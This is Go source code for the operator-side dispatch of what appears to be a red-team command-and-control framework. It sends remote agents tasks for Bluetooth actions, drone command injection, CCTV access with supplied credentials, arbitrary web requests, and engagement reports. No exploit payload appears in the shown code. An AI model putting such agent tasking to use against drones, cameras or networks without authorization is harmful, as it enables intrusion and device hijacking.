func runCSIntDispatch(mgr *session.Manager, a csintArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("ci-%d", time.Now().UnixNano())
	log.Printf("[csint] %s root=%q query=%q -> %s", a.Action, a.Root, a.Query, s.AgentID)
	req := proto.CSIntStart{
		SessionID: sessionID,
		Action:    a.Action,
		Root:      a.Root,
		Query:     a.Query,
		IndexPath: a.IndexPath,
	}
	if err := s.SendCSIntStart(sessionID, req); err != nil {
		log.Printf("[csint] start: %v", err)
	}
}

// bluetoothArgs carries the operator's -bluetooth* flags.
type bluetoothArgs struct {
	Action   string
	Address  string
	Duration int
}

// runBluetoothDispatch waits for the first agent, sends a BluetoothStart.
func runBluetoothDispatch(mgr *session.Manager, a bluetoothArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("bt-%d", time.Now().UnixNano())
	log.Printf("[bluetooth] %s addr=%q -> %s", a.Action, a.Address, s.AgentID)
	req := proto.BluetoothStart{
		SessionID: sessionID,
		Action:    a.Action,
		Address:   a.Address,
		Duration:  a.Duration,
	}
	if err := s.SendBluetoothStart(sessionID, req); err != nil {
		log.Printf("[bluetooth] start: %v", err)
	}
}

// droneArgs carries the operator's -drone* flags.
type droneArgs struct {
	Action     string
	Host       string
	Port       int
	SysID      uint8
	CompID     uint8
	TargetSys  uint16
	TargetComp uint16
	Command    uint16
	Listen     int
	Lat        float32
	Lon        float32
	Alt        float32
	UseV2      bool
	SigKey     string
	LinkID     uint8
}

// runDroneDispatch waits for the first agent, sends a DroneStart.
func runDroneDispatch(mgr *session.Manager, a droneArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("dr-%d", time.Now().UnixNano())
	log.Printf("[drone] %s @ %s:%d -> %s", a.Action, a.Host, a.Port, s.AgentID)
	req := proto.DroneStart{
		SessionID:      sessionID,
		Action:         a.Action,
		Host:           a.Host,
		Port:           a.Port,
		SysID:          a.SysID,
		CompID:         a.CompID,
		TargetSys:      a.TargetSys,
		TargetComp:     a.TargetComp,
		Command:        a.Command,
		ListenDuration: a.Listen,
		Lat:            a.Lat,
		Lon:            a.Lon,
		Alt:            a.Alt,
		UseV2:          a.UseV2,
		SigKeyHex:      a.SigKey,
		LinkID:         a.LinkID,
	}
	if err := s.SendDroneStart(sessionID, req); err != nil {
		log.Printf("[drone] start: %v", err)
	}
}

// cctvArgs carries the operator's -cctv* flags.
type cctvArgs struct {
	Action  string
	Host    string
	URL     string
	User    string
	Pass    string
	Timeout int
}

// runCCTV waits for the first agent, sends a CCTVStart. Name re-used here
// for the core-side dispatch; the agent has its own handler.
func runCCTV(mgr *session.Manager, a cctvArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("cv-%d", time.Now().UnixNano())
	log.Printf("[cctv] %s host=%q url=%q -> %s", a.Action, a.Host, a.URL, s.AgentID)
	req := proto.CCTVStart{
		SessionID: sessionID,
		Action:    a.Action,
		Host:      a.Host,
		URL:       a.URL,
		User:      a.User,
		Pass:      a.Pass,
		Timeout:   a.Timeout,
	}
	if err := s.SendCCTVStart(sessionID, req); err != nil {
		log.Printf("[cctv] start: %v", err)
	}
}

// reportArgs carries the operator's -report-* flags.
type reportArgs struct {
	Title      string
	Operator   string
	Engagement string
	SourceDir  string
	Findings   string
	OutPath    string
}

// runReportDispatch waits for the first agent, sends a ReportStart.
func runReportDispatch(mgr *session.Manager, a reportArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("rp-%d", time.Now().UnixNano())
	log.Printf("[report] %q -> %s", a.Title, s.AgentID)
	req := proto.ReportStart{
		SessionID:    sessionID,
		Title:        a.Title,
		Operator:     a.Operator,
		Engagement:   a.Engagement,
		SourceDir:    a.SourceDir,
		FindingsJSON: a.Findings,
		OutPath:      a.OutPath,
	}
	if err := s.SendReportStart(sessionID, req); err != nil {
		log.Printf("[report] start: %v", err)
	}
}

// webReqArgs carries the operator's -webreq* flags.
type webReqArgs struct {
	URL     string
	Method  string
	Body    string
	Timeout int
	SkipTLS bool
}

// runWebReqDispatch waits for the first agent, sends a WebReqStart.
func runWebReqDispatch(mgr *session.Manager, a webReqArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("wr-%d", time.Now().UnixNano())
	log.Printf("[webreq] %s %s -> %s", a.Method, a.URL, s.AgentID)
	req := proto.WebReqStart{
		SessionID: sessionID,
		URL:       a.URL,
		Method:    a.Method,
		Body:      []byte(a.Body),
		Timeout:   a.Timeout,
		SkipTLS:   a.SkipTLS,
	}
	if err := s.SendWebReqStart(sessionID, req); err != nil {
		log.Printf("[webreq] start: %v", err)
	}
}

// workflowArgs carries the operator's -workflow* flags.
type workflowArgs struct {
	Steps       []string
	DryRun      bool
	CSIntRoot   string
	ReportTitle string
}

// runWorkflowDispatch waits for the first agent, sends a WorkflowStart.
func runWorkflowDispatch(mgr *session.Manager, a workflowArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("wf-%d", time.Now().UnixNano())
	log.Printf("[workflow] %d steps dry=%v -> %s", len(a.Steps), a.DryRun, s.AgentID)
	req := proto.WorkflowStart{
		SessionID:   sessionID,
		Steps:       a.Steps,
		DryRun:      a.DryRun,
		CSIntRoot:   a.CSIntRoot,
		ReportTitle: a.ReportTitle,
	}
	if err := s.SendWorkflowStart(sessionID, req); err != nil {
		log.Printf("[workflow] start: %v", err)
	}
}
